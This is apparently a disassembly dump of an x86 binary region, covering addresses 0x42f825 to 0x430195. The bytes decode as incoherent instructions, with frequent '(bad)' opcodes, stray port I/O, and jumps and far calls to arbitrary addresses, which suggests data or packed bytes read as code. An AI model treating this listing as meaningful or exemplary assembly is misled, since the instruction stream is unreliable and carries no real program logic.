  42f825:	xor    eax,0x5703eb72
  42f82a:	pop    ebp
  42f82b:	adc    BYTE PTR [esi+ebp*8-0xe],0x7e
  42f830:	sub    esi,edi
  42f832:	scas   al,BYTE PTR es:[edi]
  42f833:	cmp    al,BYTE PTR [esp+edi*2-0x5dc9dd90]
  42f83a:	inc    edx
  42f83b:	mov    edi,ecx
  42f83d:	retf   0x47e1
  42f840:	cli    
  42f841:	push   ss
  42f842:	jb     0x42f87e
  42f844:	mov    bh,0xd9
  42f846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f847:	pop    esi
  42f848:	scas   eax,DWORD PTR es:[edi]
  42f849:	inc    esp
  42f84a:	aaa    
  42f84b:	mov    esi,0x4716cc12
  42f850:	mov    esi,0xc6a97944
  42f855:	xor    edx,DWORD PTR [ecx-0x5d]
  42f858:	outs   dx,BYTE PTR ds:[esi]
  42f859:	pushf  
  42f85a:	mov    edi,0x45c9d3ad
  42f85f:	bound  eax,QWORD PTR [ecx]
  42f861:	push   edi
  42f862:	les    esi,FWORD PTR [eiz*4+0x3bed67df]
  42f869:	pop    ecx
  42f86a:	lock push 0x22
  42f86d:	out    dx,al
  42f86e:	into   
  42f86f:	retf   
  42f870:	lods   al,BYTE PTR ds:[esi]
  42f871:	push   esi
  42f872:	mov    cs,eax
  42f874:	jg     0x42f83d
  42f876:	mov    ebp,0x53785130
  42f87b:	jne    0x42f8b1
  42f87d:	dec    edi
  42f87e:	mov    ds:0xd6532659,al
  42f883:	(bad)
  42f886:	adc    al,BYTE PTR [ebp-0x4074852f]
  42f88c:	test   al,0x3
  42f88e:	dec    esi
  42f88f:	fistp  QWORD PTR [ebp-0x5a]
  42f892:	(bad)  
  42f893:	mov    al,0xfd
  42f896:	fninit 
  42f898:	ss push ebp
  42f89a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f89b:	imul   esp,DWORD PTR [esi+0x2fae55a],0x1a7b5504
  42f8a5:	cdq    
  42f8a6:	fwait
  42f8a7:	push   ss
  42f8a8:	cli    
  42f8a9:	rcr    dh,1
  42f8ab:	jl     0x42f927
  42f8ad:	imul   esi,esi,0x48590521
  42f8b3:	(bad)  
  42f8b5:	jns    0x42f89a
  42f8b7:	or     BYTE PTR [edi+0x58],ah
  42f8ba:	das    
  42f8bb:	sbb    bl,BYTE PTR [ecx+0x50caf6c9]
  42f8c1:	lods   al,BYTE PTR ds:[esi]
  42f8c2:	xor    ch,ah
  42f8c4:	jge    0x42f93f
  42f8c6:	add    eax,0xeb6a37b
  42f8cb:	push   edi
  42f8cc:	hlt    
  42f8cd:	std    
  42f8ce:	loope  0x42f85d
  42f8d0:	enter  0x4f18,0x1e
  42f8d4:	cmp    BYTE PTR [edi],bl
  42f8d6:	inc    ecx
  42f8d7:	leave  
  42f8d8:	pop    edx
  42f8d9:	jg     0x42f898
  42f8db:	aam    0x4
  42f8dd:	es retf 
  42f8df:	jecxz  0x42f8ff
  42f8e1:	inc    edx
  42f8e2:	popa   
  42f8e3:	jb     0x42f943
  42f8e5:	ss sar cl,0x2a
  42f8e9:	inc    eax
  42f8ea:	jp     0x42f952
  42f8ec:	mov    dl,0x4a
  42f8ee:	jne    0x42f918
  42f8f0:	cmp    eax,DWORD PTR [eax+0x6dd5ff3d]
  42f8f6:	clc    
  42f8f7:	mov    edx,0x5c76af38
  42f8fc:	nop
  42f8fd:	shl    BYTE PTR [esi-0x1d977179],cl
  42f903:	call   0x242c5e59
  42f908:	dec    esi
  42f909:	cmp    ecx,DWORD PTR [ebp-0x12c39e96]
  42f90f:	add    DWORD PTR [eax],eax
	...
  42f971:	add    BYTE PTR [eax],al
  42f973:	add    BYTE PTR [esp+esi*2],dl
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f9b9
  42f981:	fisttp WORD PTR [esi+0x1fd78f3]
  42f987:	add    BYTE PTR [ecx+eax*1],al
  42f98a:	add    BYTE PTR [eax],al
  42f98c:	imul   ecx,DWORD PTR [edx],0x74
  42f98f:	sub    al,0x17
  42f991:	mov    ss,WORD PTR [edi]
  42f993:	sub    eax,0xb31728f2
  42f998:	lods   al,BYTE PTR ds:[esi]
  42f999:	mov    dl,cl
  42f99b:	retf   0x885a
  42f99e:	push   ebx
  42f99f:	push   cs
  42f9a0:	pop    esp
  42f9a1:	leave  
  42f9a2:	mov    BYTE PTR [ecx],dh
  42f9a4:	push   ebx
  42f9a5:	push   0x32094216
  42f9aa:	sub    DWORD PTR [esi],edi
  42f9ac:	fst    DWORD PTR [ecx+0x1b]
  42f9af:	js     0x42f942
  42f9b1:	dec    ecx
  42f9b2:	mov    fs,esp
  42f9b4:	stos   BYTE PTR es:[edi],al
  42f9b5:	js     0x42f9a5
  42f9b7:	loopne 0x42fa17
  42f9b9:	push   ebp
  42f9ba:	push   ecx
  42f9bb:	bound  ebp,QWORD PTR [esi-0x1380b800]
  42f9c1:	jae    0x42f953
  42f9c3:	sub    al,0x3a
  42f9c5:	push   ebp
  42f9c6:	inc    esp
  42f9c7:	jecxz  0x42f9ef
  42f9c9:	mov    dl,0x83
  42f9cb:	jl     0x42f9a2
  42f9cd:	mov    dh,0xce
  42f9cf:	xchg   esi,eax
  42f9d0:	jne    0x42f9cf
  42f9d2:	daa    
  42f9d3:	cli    
  42f9d4:	adc    DWORD PTR [eax+0x65c3ce6a],eax
  42f9da:	sbb    DWORD PTR [ebp+0x52],esp
  42f9dd:	les    ebp,FWORD PTR [esp+ebp*8+0x1d]
  42f9e1:	jmp    0x42f9dc
  42f9e3:	popa   
  42f9e4:	retf   
  42f9e5:	xchg   BYTE PTR [eax+0x4f],bh
  42f9e8:	sbb    dh,BYTE PTR [edx]
  42f9ea:	retf   
  42f9eb:	pushf  
  42f9ec:	jle    0x42fa3d
  42f9ee:	imul   ebp,ecx,0x17
  42f9f1:	jno    0x42fa4b
  42f9f3:	dec    esi
  42f9f4:	push   ss
  42f9f5:	and    DWORD PTR [eax+ebp*8+0x4e],edi
  42f9f9:	ins    BYTE PTR es:[edi],dx
  42f9fa:	or     dl,BYTE PTR [ecx]
  42f9fc:	push   ds
  42f9fd:	repz adc dh,BYTE PTR [esi+eiz*2-0x3da3c888]
  42fa05:	cwde   
  42fa06:	fisub  DWORD PTR [edi]
  42fa08:	loope  0x42fa4f
  42fa0a:	into   
  42fa0b:	sub    dh,dh
  42fa0d:	popa   
  42fa0e:	fs xor eax,0x8b0562d0
  42fa14:	push   0xaf0272ae
  42fa19:	popa   
  42fa1a:	test   eax,0xd0fd6ccc
  42fa1f:	add    DWORD PTR [eax+esi*1-0x18b081c5],esi
  42fa26:	jge    0x42f9fe
  42fa28:	add    BYTE PTR [ebx],bl
  42fa2a:	pop    es
  42fa2b:	mov    edx,0xe2b8579d
  42fa30:	pushf  
  42fa31:	mov    ebx,0x67cc36f3
  42fa36:	xor    eax,0xe5525b99
  42fa3b:	(bad)  
  42fa3c:	(bad)  
  42fa3d:	mov    bh,0x66
  42fa3f:	int3   
  42fa40:	or     al,BYTE PTR [esi+0xf2c9ae9]
  42fa46:	sub    BYTE PTR [eax+0x7e81697d],dh
  42fa4c:	sub    bl,dl
  42fa4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fa4f:	cmp    ecx,DWORD PTR [ebp+0x7ed346ef]
  42fa55:	adc    DWORD PTR [ebx+0x43],edi
  42fa58:	cmp    al,BYTE PTR [edi+esi*1+0x4]
  42fa5c:	mov    dl,0x38
  42fa5e:	retf   0xb353
  42fa61:	push   ss
  42fa62:	inc    ebp
  42fa63:	fist   DWORD PTR [ecx]
  42fa65:	add    ch,dl
  42fa67:	cdq    
  42fa68:	sbb    esp,eax
  42fa6a:	xchg   dh,cl
  42fa6c:	lods   al,BYTE PTR ds:[esi]
  42fa6d:	je     0x42f9fc
  42fa6f:	iret   
  42fa70:	xor    DWORD PTR [esp+ecx*4+0x7],ecx
  42fa74:	push   es
  42fa75:	mov    edi,0x41a1396b
  42fa7a:	mov    ebx,0xc91f1af7
  42fa7f:	mov    ch,0x2a
  42fa81:	aam    0x96
  42fa83:	cli    
  42fa84:	stos   DWORD PTR es:[edi],eax
  42fa85:	xor    BYTE PTR [eax-0x6b],ch
  42fa88:	fst    DWORD PTR [ecx-0x59]
  42fa8b:	bound  ebx,QWORD PTR [esi+0x21f1c6]
	...
  42faf1:	add    BYTE PTR [eax],al
  42faf3:	add    BYTE PTR [ebx],bl
  42faf5:	out    dx,eax
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	sub    al,0xa9
  42fb02:	jnp    0x42face
  42fb04:	jl     0x42fb04
  42fb06:	add    DWORD PTR [eax],eax
  42fb08:	add    al,0x1
  42fb0a:	add    BYTE PTR [eax],al
  42fb0c:	lahf   
  42fb0d:	xor    ecx,DWORD PTR [eax-0x5e]
  42fb10:	into   
  42fb11:	push   ebp
  42fb12:	jno    0x42fb1e
  42fb14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb15:	pushf  
  42fb16:	xchg   ebp,ebp
  42fb18:	icebp  
  42fb19:	aam    0x5b
  42fb1b:	mov    ds:0xddde3410,al
  42fb20:	in     eax,dx
  42fb21:	das    
  42fb22:	push   es
  42fb23:	mov    bl,0xe7
  42fb25:	repnz fisttp QWORD PTR [ecx-0x16bed086]
  42fb2c:	in     eax,0x9
  42fb2e:	mov    ds:0x3280a0dd,eax
  42fb33:	add    dh,BYTE PTR [ecx+0x61c9ace1]
  42fb39:	gs push 0xe41cddb3
  42fb3f:	test   DWORD PTR [edi],esp
  42fb41:	adc    BYTE PTR [ebx+0x4db11e85],0x15
  42fb48:	push   eax
  42fb49:	lock cld 
  42fb4b:	or     ah,0x1d
  42fb4e:	jge    0x42fbcd
  42fb50:	xchg   ecx,eax
  42fb51:	adc    ch,BYTE PTR [edi-0x1a34272b]
  42fb57:	push   cs
  42fb58:	jge    0x42fb6e
  42fb5a:	data16 (bad) 
  42fb5c:	xchg   ecx,eax
  42fb5d:	fs jmp 0x42fbb5
  42fb60:	std    
  42fb61:	stos   BYTE PTR es:[edi],al
  42fb62:	jmp    0x42fb89
  42fb64:	mov    ch,0xd3
  42fb66:	xchg   esp,eax
  42fb67:	mov    ah,0xb9
  42fb69:	jg     0x42fb39
  42fb6b:	out    0x50,al
  42fb6d:	scas   al,BYTE PTR es:[edi]
  42fb6e:	add    eax,0x7d96caea
  42fb73:	fs cwde 
  42fb75:	into   
  42fb76:	xchg   edi,eax
  42fb77:	mov    ebp,0xcfe2b371
  42fb7c:	inc    ebx
  42fb7d:	scas   al,BYTE PTR es:[edi]
  42fb7e:	push   esp
  42fb7f:	sbb    BYTE PTR [ebx+0x36c0c110],ch
  42fb85:	(bad)  
  42fb87:	cwde   
  42fb88:	dec    esi
  42fb89:	(bad)  ds:0xb074ed15
  42fb8f:	mov    ch,0xbd
  42fb91:	out    0x55,eax
  42fb93:	(bad)  [ebx]
  42fb95:	das    
  42fb96:	and    eax,0x78dcf144
  42fb9b:	fist   DWORD PTR [esp+ebp*8]
  42fb9e:	add    al,0x9c
  42fba0:	scas   al,BYTE PTR es:[edi]
  42fba1:	mov    ?,WORD PTR [edx+0x6]
  42fba4:	cmp    eax,0xf3cafd6b
  42fba9:	jno    0x42fb33
  42fbab:	mov    al,0x3a
  42fbad:	dec    edx
  42fbae:	xlat   BYTE PTR ds:[ebx]
  42fbaf:	adc    eax,0x18196f20
  42fbb4:	sbb    DWORD PTR [esi+0x74],ebp
  42fbb7:	call   0x7f87c728
  42fbbc:	sub    BYTE PTR ds:0xba3bbd79,bl
  42fbc2:	leave  
  42fbc3:	rcl    BYTE PTR [eax-0x4e],0x84
  42fbc7:	cdq    
  42fbc8:	or     BYTE PTR [eax],bl
  42fbca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fbcb:	(bad)  
  42fbcc:	dec    ebp
  42fbcd:	or     edx,DWORD PTR [edx+edi*1+0x4a777b14]
  42fbd4:	add    esi,edi
  42fbd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fbd7:	mov    ebp,0x1a9bc89e
  42fbdc:	xchg   DWORD PTR [esi],edi
  42fbde:	mov    ax,ds:0xd57a929f
  42fbe4:	pop    eax
  42fbe5:	push   cs
  42fbe6:	or     eax,0x192ffe22
  42fbeb:	stos   BYTE PTR es:[edi],al
  42fbec:	adc    BYTE PTR [ecx-0x763d82e1],ah
  42fbf2:	pop    ss
  42fbf3:	mov    al,0xd8
  42fbf5:	xor    BYTE PTR [ebp-0x3],dl
  42fbf8:	xor    al,0x89
  42fbfa:	fimul  DWORD PTR [ecx-0x49765b3b]
  42fc00:	adc    DWORD PTR [esi-0x8],edi
  42fc03:	mov    esi,0xf13ded7e
  42fc08:	mov    ch,0x8b
  42fc0a:	or     esp,DWORD PTR [ebp+0x434fc491]
	...
  42fc74:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fc7a:	mov    ebx,0x36325e9a
  42fc7f:	and    BYTE PTR [edi],ch
  42fc81:	xor    ebx,ebp
  42fc83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fc84:	cmp    bh,0x1
  42fc87:	add    BYTE PTR [ecx+eax*1],al
  42fc8a:	add    BYTE PTR [eax],al
  42fc8c:	sub    eax,edx
  42fc8e:	xor    eax,0xc7913881
  42fc93:	sbb    DWORD PTR [esi-0x28],esi
  42fc96:	cld    
  42fc97:	fcmovnu st,st(1)
  42fc99:	push   ecx
  42fc9a:	xlat   BYTE PTR ds:[ebx]
  42fc9b:	sub    DWORD PTR [esi-0x1bd07ede],eax
  42fca1:	inc    ebx
  42fca2:	jne    0x42fd11
  42fca4:	add    ch,BYTE PTR [esi-0x45a4251c]
  42fcaa:	stc    
  42fcab:	pop    esp
  42fcac:	add    al,0xfb
  42fcae:	inc    eax
  42fcaf:	add    BYTE PTR [edi+0x26],ch
  42fcb2:	xchg   ecx,eax
  42fcb3:	mov    DWORD PTR [edi+ecx*1+0x70],ecx
  42fcb7:	xchg   ebx,eax
  42fcb8:	sub    esp,DWORD PTR [ebp+0x4c]
  42fcbb:	fs pop ss
  42fcbd:	call   0x5982:0xebae5443
  42fcc4:	adc    esi,DWORD PTR [eax]
  42fcc6:	pop    ecx
  42fcc7:	add    DWORD PTR [edx+0x72],esp
  42fcca:	cmp    esp,ebp
  42fccc:	pop    ss
  42fccd:	nop
  42fcce:	in     al,dx
  42fccf:	jg     0x42fd41
  42fcd1:	stos   DWORD PTR es:[edi],eax
  42fcd2:	(bad)  
  42fcd3:	fcmovnbe st,st(4)
  42fcd5:	jno    0x42fce0
  42fcd7:	out    dx,eax
  42fcd8:	ficomp DWORD PTR [esi+0x40]
  42fcdb:	pushf  
  42fcdc:	and    DWORD PTR [esi+eiz*2+0x6d30cd50],edx
  42fce3:	mov    ah,cl
  42fce5:	jmp    0x42fd3c
  42fce7:	fs jae 0x42fd57
  42fcea:	inc    esi
  42fceb:	xchg   ebx,eax
  42fcec:	ret    
  42fced:	jo     0x42fca2
  42fcef:	test   eax,0xe15129e6
  42fcf4:	jbe    0x42fcfc
  42fcf6:	fst    DWORD PTR [ecx+0x7b]
  42fcf9:	ja     0x42fcda
  42fcfb:	call   0x1bf68048
  42fd00:	mov    ah,0x1d
  42fd02:	rol    DWORD PTR [edi+0x36],cl
  42fd05:	popf   
  42fd06:	ss xchg esi,eax
  42fd08:	xlat   BYTE PTR ds:[ebx]
  42fd09:	aaa    
  42fd0a:	inc    edi
  42fd0b:	enter  0x9bf1,0xbf
  42fd0f:	sbb    BYTE PTR [eax+0x27a15ddd],0xfa
  42fd16:	xchg   esi,eax
  42fd17:	jo     0x42fd3e
  42fd19:	inc    eax
  42fd1a:	adc    edx,ecx
  42fd1c:	fadd   st(0),st
  42fd1e:	mov    BYTE PTR [edi+0x2b],dl
  42fd21:	jp     0x42fd77
  42fd23:	(bad)  
  42fd24:	fld    DWORD PTR ds:0x66373b39
  42fd2a:	push   esi
  42fd2b:	mov    eax,0x7b28ffce
  42fd30:	mov    fs,WORD PTR [ebp-0x7f]
  42fd33:	mov    ds:0x67e43cff,eax
  42fd38:	int    0x40
  42fd3a:	je     0x42fdab
  42fd3c:	mov    ss,ebp
  42fd3e:	dec    ecx
  42fd3f:	arpl   WORD PTR [esi+0x2ef6ea23],cx
  42fd45:	xchg   ebp,eax
  42fd46:	pop    ebx
  42fd47:	fild   QWORD PTR [edi-0x49810c8d]
  42fd4d:	scas   eax,DWORD PTR es:[edi]
  42fd4e:	add    ebx,ebx
  42fd50:	sub    esi,DWORD PTR [esi+0x29]
  42fd53:	push   0xe597f511
  42fd58:	sbb    DWORD PTR [edx-0x2],0xffffffc3
  42fd5c:	jge    0x42fd10
  42fd5e:	adc    eax,0x6054c787
  42fd63:	adc    bl,bh
  42fd65:	mov    edx,0x5920256d
  42fd6a:	xor    dh,BYTE PTR [ebx-0x2c]
  42fd6d:	(bad)  
  42fd6e:	lahf   
  42fd6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fd70:	dec    edi
  42fd71:	test   ecx,eax
  42fd73:	ror    bh,1
  42fd75:	into   
  42fd76:	retf   
  42fd77:	xchg   esi,eax
  42fd78:	inc    ecx
  42fd79:	push   ebx
  42fd7a:	fwait
  42fd7b:	inc    edi
  42fd7c:	jle    0x42fdb3
  42fd7e:	xchg   ecx,eax
  42fd7f:	stos   BYTE PTR es:[edi],al
  42fd80:	mov    ah,0xb3
  42fd82:	jbe    0x42fd29
  42fd84:	les    ebx,FWORD PTR [eax]
  42fd86:	xor    dl,BYTE PTR [edx+0x35c1f2e]
  42fd8c:	mov    esp,0xb5c3a0
	...
  42fdf1:	add    BYTE PTR [eax],al
  42fdf3:	add    BYTE PTR [eax-0x40],cl
  42fdf6:	ret    0xcaf0
  42fdf9:	bnd jp 0x42fdf4
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz shl DWORD PTR [edi+0x10],cl
  42fe03:	(bad)  
  42fe04:	test   BYTE PTR [eax],al
  42fe06:	add    al,BYTE PTR [eax]
  42fe08:	add    al,0x1
  42fe0a:	add    BYTE PTR [eax],al
  42fe0c:	scas   eax,DWORD PTR es:[edi]
  42fe0d:	sub    BYTE PTR [ebx-0x783e7613],bl
  42fe13:	cmc    
  42fe14:	mov    bh,0xd7
  42fe16:	mov    al,ds:0xa482d3b2
  42fe1b:	mov    dl,0x81
  42fe1d:	adc    eax,0x2e92b334
  42fe22:	popf   
  42fe23:	(bad)  
  42fe24:	into   
  42fe25:	mov    ecx,0x73e2261d
  42fe2a:	ja     0x42fdf9
  42fe2c:	mov    esi,0x9133d938
  42fe31:	stos   DWORD PTR es:[edi],eax
  42fe32:	lods   eax,DWORD PTR ds:[esi]
  42fe33:	repnz xor al,BYTE PTR [ebx-0x1112ff3e]
  42fe3a:	mov    ah,0x9f
  42fe3c:	inc    edx
  42fe3d:	dec    esi
  42fe3e:	aam    0x6e
  42fe40:	stos   DWORD PTR es:[edi],eax
  42fe41:	push   cs
  42fe42:	jg     0x42fdda
  42fe44:	pop    es
  42fe45:	mov    edx,0xa4418e76
  42fe4a:	or     al,0xdb
  42fe4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fe4d:	fsub   QWORD PTR [esp+edx*2+0x61ae9bb6]
  42fe54:	outs   dx,BYTE PTR ds:[esi]
  42fe55:	mov    ch,0xbc
  42fe57:	imul   esp,edi,0x64
  42fe5a:	clc    
  42fe5b:	enter  0x73e6,0x9d
  42fe5f:	mov    cl,0xad
  42fe61:	mov    eax,0x39278622
  42fe66:	inc    eax
  42fe67:	fs xor eax,0x84f059d
  42fe6d:	mov    dl,0x52
  42fe6f:	test   BYTE PTR [ecx+ecx*8-0xf38ccec],dh
  42fe76:	mov    ebp,0xcb453b87
  42fe7b:	and    al,0x63
  42fe7d:	adc    ecx,ecx
  42fe7f:	and    al,0xd3
  42fe81:	push   0x47376ff2
  42fe86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fe87:	out    dx,eax
  42fe88:	dec    ebp
  42fe89:	push   ebp
  42fe8a:	popf   
  42fe8b:	retf   0xab
  42fe8e:	sbb    BYTE PTR [ebx],0xbd
  42fe91:	cld    
  42fe92:	icebp  
  42fe93:	aad    0xf5
  42fe95:	out    0xf5,eax
  42fe97:	or     DWORD PTR [edx-0x36],ebx
  42fe9a:	pop    edi
  42fe9b:	fcmovb st,st(4)
  42fe9d:	push   ss
  42fe9e:	sbb    bl,bh
  42fea0:	mov    dh,0x7e
  42fea2:	mov    bl,0x19
  42fea4:	push   edi
  42fea5:	xchg   ch,ah
  42fea7:	lods   al,BYTE PTR ds:[esi]
  42fea8:	cs leave 
  42feaa:	pop    edi
  42feab:	pop    ds
  42feac:	xchg   DWORD PTR [ebp+0x33390cc4],edx
  42feb2:	mov    edi,0x7bbb482b
  42feb7:	(bad)  [edx-0x6]
  42feba:	inc    ebx
  42febb:	xchg   edx,eax
  42febc:	cdq    
  42febd:	stos   BYTE PTR es:[edi],al
  42febe:	pop    ebx
  42febf:	daa    
  42fec0:	test   BYTE PTR [eax-0x13],ch
  42fec3:	retf   
  42fec4:	adc    ah,dl
  42fec6:	cwde   
  42fec7:	jbe    0x42fea1
  42fec9:	lea    edx,[eax-0x13]
  42fecc:	popf   
  42fecd:	popf   
  42fece:	add    DWORD PTR [edx-0x5c384f3e],esi
  42fed4:	mov    cl,0x78
  42fed6:	sahf   
  42fed7:	aaa    
  42fed8:	pop    ebp
  42fed9:	scas   eax,DWORD PTR es:[edi]
  42feda:	ret    
  42fedb:	jecxz  0x42ff0d
  42fedd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fede:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fedf:	mov    eax,ds:0x91084d79
  42fee4:	cdq    
  42fee5:	loopne 0x42ff34
  42fee7:	adc    al,0x8b
  42fee9:	jnp    0x42feda
  42feeb:	or     al,0xba
  42feed:	adc    DWORD PTR [edi+ecx*8-0x5],0xffffffd4
  42fef2:	jae    0x42ff58
  42fef4:	scas   eax,DWORD PTR es:[edi]
  42fef5:	hlt    
  42fef6:	jl     0x42fef8
  42fef8:	dec    esi
  42fef9:	outs   dx,BYTE PTR ds:[esi]
  42fefa:	(bad)  
  42fefc:	and    ch,BYTE PTR [ecx+0x43]
  42feff:	jmp    0xb67c6ea0
  42ff04:	jmp    0xf1ad:0xa6cedcc1
  42ff0b:	xchg   edx,eax
  42ff0c:	clc    
  42ff0d:	jo     0x42ff0c
  42ff0f:	scas   al,BYTE PTR es:[edi]
	...
  42ff74:	add    al,0x67
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [eax+edi*1+0xa],0xe2
  42ff83:	xchg   ebp,eax
  42ff84:	mov    BYTE PTR [ecx],al
  42ff86:	add    al,BYTE PTR [eax]
  42ff88:	add    al,0x1
  42ff8a:	add    BYTE PTR [eax],al
  42ff8c:	or     BYTE PTR [ebx+0x79e18f6b],cl
  42ff92:	rcr    BYTE PTR [ebp+ebp*2-0x6cb26be5],cl
  42ff99:	ret    
  42ff9a:	int3   
  42ff9b:	lea    edx,[ebp-0x3464275e]
  42ffa1:	fcmove st,st(2)
  42ffa3:	call   FWORD PTR [edi+0x42]
  42ffa6:	mov    ecx,DWORD PTR [edi-0x43]
  42ffa9:	test   al,0x55
  42ffab:	mov    ds:0x44f42438,eax
  42ffb0:	loopne 0x42ff8d
  42ffb2:	mov    ecx,0x480f17e3
  42ffb7:	repz inc edx
  42ffb9:	icebp  
  42ffba:	addr16 mov edx,0x8cf86749
  42ffc0:	mov    al,0x88
  42ffc2:	xchg   edx,eax
  42ffc3:	aaa    
  42ffc4:	fwait
  42ffc5:	idiv   DWORD PTR [edi-0x45]
  42ffc8:	pop    esi
  42ffc9:	loop   0x42ff99
  42ffcb:	shl    BYTE PTR [esi-0x49],0x4d
  42ffcf:	xor    dl,BYTE PTR [edx+0x73]
  42ffd2:	fimul  WORD PTR [edx]
  42ffd4:	push   0xfa462447
  42ffd9:	in     eax,0x3b
  42ffdb:	lea    ebp,[edx-0x36c10a6]
  42ffe1:	push   edi
  42ffe2:	mov    al,0xb
  42ffe4:	(bad)  
  42ffe5:	jnp    0x43004f
  42ffe7:	or     al,0xe0
  42ffe9:	fisub  WORD PTR [edx-0x59d09a97]
  42ffef:	inc    esi
  42fff0:	pop    ebp
  42fff1:	std    
  42fff2:	pop    esp
  42fff3:	pop    ecx
  42fff4:	push   ecx
  42fff5:	mov    esi,0x3d3c50ca
  42fffa:	gs int 0x1c
  42fffd:	xor    al,0xd5
  42ffff:	bound  ebx,QWORD PTR [ebp-0x72722566]
  430005:	in     eax,dx
  430006:	repz inc edi
  430008:	add    BYTE PTR [esi],cl
  43000a:	pop    ebx
  43000b:	js     0x42ffa3
  43000d:	(bad)  
  43000e:	int    0x68
  430010:	sti    
  430011:	dec    esi
  430012:	add    al,0x0
  430014:	jns    0x42ffd8
  430016:	int    0xeb
  430018:	es xor eax,0x38184955
  43001e:	xchg   esi,eax
  43001f:	inc    edi
  430020:	push   edi
  430021:	ror    ebx,1
  430023:	cmp    esp,DWORD PTR [ecx]
  430025:	aam    0x6b
  430027:	outs   dx,BYTE PTR ds:[esi]
  430028:	inc    esp
  430029:	pusha  
  43002a:	repz dec ebp
  43002c:	cmp    al,0x96
  43002e:	mov    ah,0x3c
  430030:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430031:	stc    
  430032:	mov    ch,0x9c
  430034:	jp     0x43009e
  430036:	cmp    ebp,esi
  430038:	mov    dh,0xe8
  43003a:	jbe    0x42ffc0
  43003c:	in     al,dx
  43003d:	inc    esi
  43003e:	add    DWORD PTR [ebp+ecx*2+0x500bf02a],ebp
  430045:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430046:	or     BYTE PTR [edi-0x22fa2a62],dh
  43004c:	sahf   
  43004d:	lds    edx,FWORD PTR [ecx+ebx*1+0x105c37e7]
  430054:	mov    bh,0x5e
  430056:	dec    eax
  430057:	dec    ecx
  430058:	xchg   BYTE PTR [eax+0x63],bh
  43005b:	int3   
  43005c:	mov    ebx,0x2a21475c
  430061:	scas   eax,DWORD PTR es:[edi]
  430062:	push   ds
  430063:	dec    ebx
  430064:	icebp  
  430065:	jnp    0x430023
  430067:	data16 adc bh,cl
  43006a:	(bad)  
  43006b:	ror    DWORD PTR [ecx-0x4303f421],1
  430071:	jb     0x430021
  430073:	add    ah,BYTE PTR [edi-0x2d0af332]
  430079:	aaa    
  43007a:	fsubr  st(6),st
  43007c:	mov    bl,0x92
  43007e:	push   esi
  43007f:	mov    gs:0x2503fb57,eax
  430085:	sub    eax,0x241f5220
  43008a:	data16 add al,0x66
  43008d:	mov    edx,0x227b
	...
  4300f2:	add    BYTE PTR [eax],al
  4300f4:	(bad)  
  4300f5:	ins    DWORD PTR es:[edi],dx
  4300f6:	aam    0xb5
  4300f8:	(bad)  
  4300f9:	mov    ebp,0x9547fe7
  4300fe:	scas   eax,DWORD PTR es:[edi]
  4300ff:	add    al,0x32
  430101:	sub    ebp,esp
  430103:	or     cl,BYTE PTR [edx+eax*1+0x630002]
  43010a:	add    BYTE PTR [eax],al
  43010c:	push   esi
  43010d:	sbb    BYTE PTR [esi+0x10],bl
  430110:	mov    BYTE PTR [edi+0x49],ah
  430113:	(bad)  
  430114:	push   edx
  430115:	fist   DWORD PTR [eax+0x292b2d35]
  43011b:	std    
  43011c:	(bad)  
  43011d:	lods   al,BYTE PTR ds:[esi]
  43011e:	sbb    bl,cl
  430120:	fcmovnb st,st(5)
  430122:	das    
  430123:	sub    DWORD PTR [edx+edi*2],0x2e
  430127:	cmc    
  430128:	pop    ss
  430129:	xchg   ebp,eax
  43012a:	retf   
  43012b:	jl     0x43011b
  43012d:	and    DWORD PTR ds:[eax+0x7d06826b],eax
  430134:	(bad)  
  430135:	add    eax,0xa58f9743
  43013a:	ret    
  43013b:	or     bl,BYTE PTR [ebx]
  43013d:	inc    ecx
  43013e:	rcl    DWORD PTR [edi],1
  430140:	pop    ecx
  430141:	sbb    al,0x4a
  430143:	inc    dx
  430145:	hlt    
  430146:	xchg   ecx,eax
  430147:	mov    eax,ds:0xff7ff155
  43014c:	retf   0x3879
  43014f:	je     0x4300f3
  430151:	or     al,0x98
  430153:	ss out 0xa6,eax
  430156:	cmp    BYTE PTR [edx+0x56],ch
  430159:	xor    BYTE PTR [ecx+edx*2-0x1e54c48c],ch
  430160:	xor    DWORD PTR [ecx-0x31],eax
  430163:	repnz sbb ebp,DWORD PTR [ecx]
  430166:	aad    0x88
  430168:	outs   dx,DWORD PTR ds:[esi]
  430169:	push   ds
  43016a:	jmp    0x0:0xd778fb12
  430171:	add    BYTE PTR [eax],al
  430173:	add    BYTE PTR [ebp+0x55],cl
  430176:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  43017c:	mov    esp,ebp
  43017e:	or     ah,dh
  430180:	dec    ebp
  430181:	add    bh,al
  430183:	add    BYTE PTR [eax],cl
  430185:	add    BYTE PTR [eax],al
  430187:	mov    DWORD PTR [eax],0x40f44545
  43018d:	xor    DWORD PTR [eax],eax
  43018f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430195:	(bad)  
